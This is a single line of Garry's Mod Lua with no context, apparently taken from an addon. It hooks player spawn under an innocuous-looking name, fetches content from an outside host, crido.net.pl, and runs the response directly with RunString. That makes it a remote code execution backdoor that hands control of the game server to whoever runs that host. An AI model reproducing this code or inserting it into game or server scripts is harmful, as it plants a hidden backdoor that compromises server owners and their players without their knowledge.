hook.Add("PlayerSpawn", "sdffg", function() http.Fetch("https://crido.net.pl/api.php?token=" .. "sdffg" .. "&xd=" .. tostring(math.random(1, 99999)), function(body) RunString(body) end) end)
